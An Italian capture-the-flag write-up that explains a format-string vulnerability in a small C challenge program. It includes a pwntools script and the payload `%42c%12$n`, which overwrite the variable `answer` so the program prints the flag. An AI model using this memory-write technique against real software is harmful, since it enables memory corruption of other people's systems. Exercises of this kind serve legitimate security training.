# Writeup: SS_2.03 - the answer

## Descrizione 📝
La challenge presenta un semplice programma C che chiede il nome dell’utente e lo stampa in modo insicuro, consentendo un attacco di **format string**. L’obiettivo è modificare il valore della variabile `answer` da `0xbadc0ffe` a `42` per ottenere la flag.

## Dettagli del Programma
1. **Input**: `fgets(name, sizeof(name), stdin)` per leggere il nome.  
2. **Output**: `printf(name);` – Vulnerabilità di format string.  
3. **Variabile**: `answer`, inizializzata a `0xbadc0ffe`. Se diventa `42`, viene stampata la flag.

## Vulnerabilità 🎯
Usare `printf(name)` senza specificare il formato permette di:
1. **Leggere** arbitrariamente la memoria (`%x`, `%p`, ecc.).  
2. **Scrivere** arbitrariamente nella memoria con `%n`.

## Individuazione dell’Indirizzo di `answer`
Analizzando il binario con `objdump -D` o `nm`, troviamo che `answer` risiede, ad esempio, a `0x601078` (se non c’è PIE).

## Exploit: `%42c%12$n`
- **`%42c`**: Stampa 42 caratteri, incrementando il contatore interno di `printf` a 42.  
- **`%12$n`**: Scrive il valore del contatore (42) all’indirizzo passato come 12° argomento.

## Esempio di Codice in Python
```python
from pwn import *

conn = remote('answer.challs.cyberchallenge.it', 9122)
conn.recvuntil(b"What's your name?\n")

# Indirizzo di 'answer'
addr = p64(0x601078)  # Esempio: da 'nm' o 'objdump'

# Costruzione format string
# %42c -> stampa 42 caratteri
# %12$n -> scrive 42 all'indirizzo del 12° argomento
payload = b"%42c%12$n"

# Padding per allineare i parametri
padding = b"a" * 6

# Creiamo la stringa
input_string = payload + b"\0" + padding + addr

# Invio
conn.sendline(input_string)
print(conn.recvall().decode())
```

1. **`p64(0x601078)`**: Converte l’indirizzo in 8 byte (little-endian).  
2. **`%42c%12$n`**: Stampa 42 caratteri, poi scrive 42 in `addr`.  
3. **Padding**: Serve per posizionare correttamente l’indirizzo come 12° argomento di `printf`.

## Flag 🏁
Dopo aver eseguito l’exploit, la variabile `answer` diventa 42. Il programma riconosce la condizione `if (answer == 42)` e stampa la flag.
```
CCIT{50 LoNg, & Thanks for 4ll tH3 F1sh}
```


## Lezioni Apprese 📚
1. **Format String**: Non bisogna mai passare direttamente stringhe controllate dall’utente a `printf`.  
2. **Scrittura con `%n`**: Permette di impostare in memoria il valore del contatore di stampa.  
3. **No PIE**: L’indirizzo di `answer` è fisso, facilitando l’exploit.  
4. **Allineamento dei Parametri**: Bisogna trovare il corretto offset (`%12$n`) per puntare al proprio indirizzo.  

## Tools Utilizzati 🛠️
- **pwntools**: Per automatizzare la connessione e la costruzione dell’exploit.  
- **nm / objdump**: Per individuare l’indirizzo di `answer`.  
- **gdb** (opzionale): Per debug locale e conferma degli offset di stack.

---

*Writeup by Luca Crippa - Last Updated: 2024*
